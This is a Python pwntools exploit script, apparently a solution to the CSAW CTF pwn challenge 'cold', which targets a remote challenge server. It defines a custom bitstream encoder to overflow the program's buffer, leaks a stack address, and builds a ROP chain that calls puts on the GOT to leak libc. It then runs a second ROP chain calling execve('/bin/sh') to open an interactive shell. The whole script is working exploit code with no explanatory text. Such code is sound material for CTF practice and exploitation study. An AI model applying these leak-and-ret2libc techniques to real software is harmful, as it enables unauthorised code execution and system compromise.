from pwn import *
from Crypto.Util.number import long_to_bytes
def encode(bitstring):
    out = []
    for i in range(0, len(bitstring), 8):
        data = bitstring[i:i+8][::-1]
        out.append(int(data,2))
    return bytes(out)
def decode(data):
    bitstring = ''.join(bin(x)[2:].zfill(8)[::-1] for x in data)[1:]
    out = []
    for i in range(0, len(bitstring), 8):
        if i + 8 >= len(bitstring):
            break
        data = bitstring[i + 7] + bitstring[i:i+7]
        out.append(int(data[::-1],2))
    return bytes(out)
def ret():
    global bits
    bits += '000'
def addbit(bit):
    global bits
    bit = str(bit)
    bits += '001' + bit
def addbyte(byte):
    global bits
    if type(byte) == bytes:
        byte = byte[0]
    if type(byte) == int:
        byte = bin(byte)[2:].zfill(8)
    bits += '010' + byte
def addbytes(data):
    for byte in data:
        addbyte(byte)
def rep(a,b):
    global bits
    bits += '011' + bin(a)[2:].zfill(10) + bin(b)[2:].zfill(10)
def seek(num):
    global bits
    bits += '100' + bin(num)[2:].zfill(16)
bits = None
e = ELF("./cold")
context.binary = e
p = e.process() if args.LOCAL else remote('pwn.chal.csaw.io', 5005)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") if args.LOCAL else ELF("./libc.so.6")
size = 8
bits = bin(size)[2:].zfill(0x14)
# Make size large
addbyte(0xff)
rep(8, 8*23)
seek(448)
# Set up repeat
addbyte(0x03) if args.LOCAL else addbyte(0x1e)
ret()
payload = bits + '0'*(16 - (len(bits) % 16))
p.sendline(encode(payload))
p.recvuntil("Output: ")
p.recvn(24)
stackleak = u64(p.recvline()[:-1].ljust(8,b'\x00'))
log.info(f"Stack leak: {hex(stackleak)}")

if args.LOCAL:
    log.info(f"Actual base: {hex(p.libs()['/home/kali/CTFs/csaw/cold/cold'])}")
e.address = 0x555555554000


rop = ROP(e)
poprdi = rop.find_gadget(["pop rdi", "ret"]).address
putsgot, putsplt = e.got['puts'], e.plt['puts']
size = 8
bits = bin(size)[2:].zfill(0x14)
# Make size large
addbyte(0xff)
rep(8, 8*23)
seek(448)
seek(2**16 - 128)
rep(64, 384)
seek(2**16 - 256)
addbytes(p64(poprdi)[:2])
seek(6 * 8)
addbytes(p64(putsgot)[:2])
seek(6 * 8)
addbytes(p64(putsplt)[:2])
seek(6 * 8)
addbytes(p64(e.sym['main'])[:2])
ret()
payload = bits + '0'*(16 - (len(bits) % 16))
p.sendline(encode(payload))
p.recvlines(3)

libcleak = u64(p.recvline()[:-1] + b'\x00\x00')
log.info(f"Libc leak: {hex(libcleak)}")
libc.address = libcleak - libc.sym['puts']
log.info(f"Libc base: {hex(libc.address)}")

pause()
size = 8
bits = bin(size)[2:].zfill(0x14)
# Make size large
addbyte(0xff)
rep(8, 8*23)
seek(448)
rop = ROP(libc)
rop.execve(next(libc.search(b"/bin/sh\x00")), 0 , 0)
addbytes(rop.chain())
ret()
payload = bits + '0'*(16 - (len(bits) % 16))
p.sendline(encode(payload))
p.interactive()